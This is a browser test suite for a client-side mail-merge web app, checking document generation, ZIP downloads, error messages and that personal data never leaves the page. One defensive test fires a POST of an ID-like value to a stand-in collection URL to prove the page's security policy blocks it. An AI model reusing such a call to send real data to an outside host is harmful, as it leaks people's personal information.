import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { chromium, type Browser, type Page, type Request } from 'playwright';
import { createServer, type Server } from 'node:http';
import { readFile } from 'node:fs/promises';
import { existsSync } from 'node:fs';
import { extname, join, normalize } from 'node:path';
import { fileURLToPath } from 'node:url';
import { unzipSync } from 'fflate';
import { readDocxText } from '@doclyst/core';
import { makeTemplate } from './helpers/template.js';

/**
 * End-to-end tests against the built page in a real browser.
 *
 * These exist mainly to hold the central privacy claim to account. Unit tests
 * can show the engine has no network code; only driving the actual page can
 * show that loading a template and a spreadsheet full of personal data, and
 * generating a folder of documents from them, causes no request to leave the
 * page.
 */

const DIST = fileURLToPath(new URL('../dist', import.meta.url));

const CSV = `Full Name,Basic Salary,Staff ID
Aisha Rahman,4500,EMP-0001
Wei Lun Tan,5200,EMP-0002
Priya Nair,6100,EMP-0003
`;

const MIME: Record<string, string> = {
  '.html': 'text/html',
  '.js': 'text/javascript',
  '.css': 'text/css',
};

let server: Server;
let browser: Browser;
let origin: string;

beforeAll(async () => {
  if (!existsSync(join(DIST, 'index.html'))) {
    throw new Error('Build the web app before running browser tests: npm run build');
  }

  server = createServer((req, res) => {
    const requested = decodeURIComponent((req.url ?? '/').split('?')[0] ?? '/');
    const relative = normalize(requested).replace(/^(\.\.[/\\])+/, '');
    const path = join(DIST, relative === '/' ? 'index.html' : relative);
    if (!path.startsWith(DIST) || !existsSync(path)) {
      res.writeHead(404).end();
      return;
    }
    readFile(path).then(
      (body) => {
        res.writeHead(200, { 'content-type': MIME[extname(path)] ?? 'application/octet-stream' });
        res.end(body);
      },
      () => res.writeHead(500).end(),
    );
  });

  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  const address = server.address();
  origin = `http://127.0.0.1:${typeof address === 'object' && address ? address.port : 0}`;

  browser = await launchChromium();
}, 60_000);

/**
 * Launch the browser, preferring whatever Playwright resolves for itself.
 *
 * Environments that pre-install Chromium expose it at a fixed path, so that is
 * used as a fallback rather than downloading anything.
 */
async function launchChromium(): Promise<Browser> {
  try {
    return await chromium.launch();
  } catch (error) {
    const preinstalled = '/opt/pw-browsers/chromium';
    if (!existsSync(preinstalled)) throw error;
    return chromium.launch({ executablePath: preinstalled });
  }
}

afterAll(async () => {
  await browser?.close();
  await new Promise<void>((resolve) => server?.close(() => resolve()));
});

/** Open the page, recording every request the browser attempts. */
async function openPage(): Promise<{ page: Page; requests: Request[] }> {
  const page = await browser.newPage();
  const requests: Request[] = [];
  page.on('request', (request) => requests.push(request));
  await page.goto(origin, { waitUntil: 'networkidle' });
  return { page, requests };
}

/** Requests to anywhere other than loading the page's own assets. */
function offOriginRequests(requests: readonly Request[]): string[] {
  return requests.map((r) => r.url()).filter((url) => !url.startsWith(origin));
}

async function loadInputs(page: Page): Promise<void> {
  await page.setInputFiles('#template-input', {
    name: 'offer.docx',
    mimeType: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    buffer: Buffer.from(makeTemplate(['FULL_NAME', 'BASIC_SALARY'])),
  });
  await page.setInputFiles('#data-input', {
    name: 'staff.csv',
    mimeType: 'text/csv',
    buffer: Buffer.from(CSV),
  });
}

describe('the built page', () => {
  it('loads without console errors', async () => {
    const errors: string[] = [];
    const page = await browser.newPage();
    page.on('console', (message) => {
      if (message.type() === 'error') errors.push(message.text());
    });
    page.on('pageerror', (error) => errors.push(error.message));
    await page.goto(origin, { waitUntil: 'networkidle' });

    expect(errors).toEqual([]);
    await page.close();
  });

  it('keeps the worksheet picker hidden for a CSV', async () => {
    // Regression guard: `hidden` is overridden by the layout rules unless the
    // stylesheet forces it, and the attribute alone reads as correct in tests.
    const { page } = await openPage();
    await loadInputs(page);
    await expect.poll(() => page.textContent('#data-summary')).toContain('3 rows');
    expect(await page.locator('#sheet-row').isVisible()).toBe(false);
    await page.close();
  });

  it('hides the progress bar once a run finishes', async () => {
    const { page } = await openPage();
    await loadInputs(page);
    await page.click('#generate');
    await expect.poll(() => page.textContent('#results')).toContain('documents ready');
    expect(await page.locator('#progress').isVisible()).toBe(false);
    await page.close();
  });

  it('reports the template"s placeholders', async () => {
    const { page } = await openPage();
    await loadInputs(page);
    await expect.poll(() => page.textContent('#template-summary')).toContain('FULL_NAME');
    await page.close();
  });

  it('reports the data"s columns and row count', async () => {
    const { page } = await openPage();
    await loadInputs(page);
    await expect.poll(() => page.textContent('#data-summary')).toContain('3 rows');
    expect(await page.textContent('#data-summary')).toContain('Full Name');
    await page.close();
  });

  it('confirms when every placeholder has a matching column', async () => {
    const { page } = await openPage();
    await loadInputs(page);
    await expect
      .poll(() => page.textContent('#data-summary'))
      .toContain('Every template placeholder has a matching column');
    await page.close();
  });

  it('generates one document per row and offers each for download', async () => {
    const { page } = await openPage();
    await loadInputs(page);
    await page.click('#generate');

    await expect.poll(() => page.textContent('#results')).toContain('3 documents ready');
    expect(await page.locator('.file-list li').count()).toBe(3);
    expect(await page.textContent('.file-list')).toContain('document-0001.docx');
    await page.close();
  });

  it('produces a document whose content is correctly substituted', async () => {
    const { page } = await openPage();
    await loadInputs(page);
    await page.click('#generate');
    await expect.poll(() => page.textContent('#results')).toContain('documents ready');

    const download = page.waitForEvent('download');
    await page.locator('.file-list button').first().click();
    const stream = await (await download).createReadStream();
    const chunks: Buffer[] = [];
    for await (const chunk of stream) chunks.push(chunk as Buffer);

    const text = readDocxText(new Uint8Array(Buffer.concat(chunks)));
    expect(text).toContain('Aisha Rahman');
    expect(text).toContain('4500');
    // One person's data must not appear in another's document.
    expect(text).not.toContain('Wei Lun Tan');
    await page.close();
  });

  it('packs every document into a downloadable ZIP', async () => {
    const { page } = await openPage();
    await loadInputs(page);
    await page.click('#generate');
    await expect.poll(() => page.textContent('#results')).toContain('documents ready');

    const download = page.waitForEvent('download');
    await page.getByRole('button', { name: 'Download all as ZIP' }).click();
    const stream = await (await download).createReadStream();
    const chunks: Buffer[] = [];
    for await (const chunk of stream) chunks.push(chunk as Buffer);

    const entries = unzipSync(new Uint8Array(Buffer.concat(chunks)));
    expect(Object.keys(entries).sort()).toEqual([
      'document-0001.docx',
      'document-0002.docx',
      'document-0003.docx',
    ]);
    await page.close();
  });

  describe('nothing leaves the device', () => {
    it('makes no off-origin request while generating a whole batch', async () => {
      // The load-bearing test for the product's central claim.
      const { page, requests } = await openPage();
      await loadInputs(page);
      await page.click('#generate');
      await expect.poll(() => page.textContent('#results')).toContain('documents ready');

      const download = page.waitForEvent('download');
      await page.getByRole('button', { name: 'Download all as ZIP' }).click();
      await download;

      expect(offOriginRequests(requests)).toEqual([]);
      await page.close();
    });

    it('is blocked by its own policy even if code tried to send data', async () => {
      // Belt and braces: the page's CSP must refuse an outbound request, so
      // the guarantee does not rest on our code staying careful.
      const { page } = await openPage();
      const blocked = await page.evaluate(async () => {
        try {
          await fetch('https://example.test/collect', {
            method: 'POST',
            body: 'S0000001A',
          });
          return 'allowed';
        } catch {
          return 'blocked';
        }
      });
      expect(blocked).toBe('blocked');
      await page.close();
    });

    it('persists nothing to browser storage', async () => {
      const { page } = await openPage();
      await loadInputs(page);
      await page.click('#generate');
      await expect.poll(() => page.textContent('#results')).toContain('documents ready');

      const stored = await page.evaluate(() => ({
        local: localStorage.length,
        session: sessionStorage.length,
        cookies: document.cookie,
        workers: navigator.serviceWorker?.controller !== undefined
          && navigator.serviceWorker?.controller !== null,
      }));
      expect(stored).toEqual({ local: 0, session: 0, cookies: '', workers: false });
      await page.close();
    });
  });

  describe('failures', () => {
    it('warns about a placeholder no column can fill', async () => {
      const { page } = await openPage();
      await page.setInputFiles('#template-input', {
        name: 'offer.docx',
        mimeType: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        buffer: Buffer.from(makeTemplate(['FULL_NAME', 'NRIC'])),
      });
      await page.setInputFiles('#data-input', {
        name: 'staff.csv',
        mimeType: 'text/csv',
        buffer: Buffer.from(CSV),
      });
      await expect.poll(() => page.textContent('#data-summary')).toContain('No column matches: NRIC');
      await page.close();
    });

    it('reports a failing row without showing any value from it', async () => {
      const { page } = await openPage();
      await page.setInputFiles('#template-input', {
        name: 'offer.docx',
        mimeType: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        buffer: Buffer.from(makeTemplate(['FULL_NAME', 'BASIC_SALARY'])),
      });
      await page.setInputFiles('#data-input', {
        name: 'staff.csv',
        mimeType: 'text/csv',
        buffer: Buffer.from('Full Name,Basic Salary\nAisha Rahman,4500\nWei Lun Tan,\n'),
      });
      await page.check('#empty-is-missing');
      await page.click('#generate');

      await expect.poll(() => page.textContent('#results')).toContain('1 row(s) failed');
      const failures = (await page.textContent('.failure-list')) ?? '';
      expect(failures).toContain('Row 2');
      expect(failures).toContain('BASIC_SALARY');
      expect(failures).not.toContain('Wei Lun Tan');
      await page.close();
    });

    it('rejects a file that is not a template', async () => {
      const { page } = await openPage();
      await page.setInputFiles('#template-input', {
        name: 'notes.docx',
        mimeType: 'application/octet-stream',
        buffer: Buffer.from('this is not a document'),
      });
      await expect.poll(() => page.textContent('#template-summary')).toContain('.docx or .pdf');
      await page.close();
    });

    it('warns when a filename pattern would expose an identifier', async () => {
      const { page } = await openPage();
      await page.fill('#filename-input', '{{NRIC}}-offer');
      await expect
        .poll(() => page.textContent('#filename-warnings'))
        .toContain('visible without opening');
      await page.close();
    });
  });
});
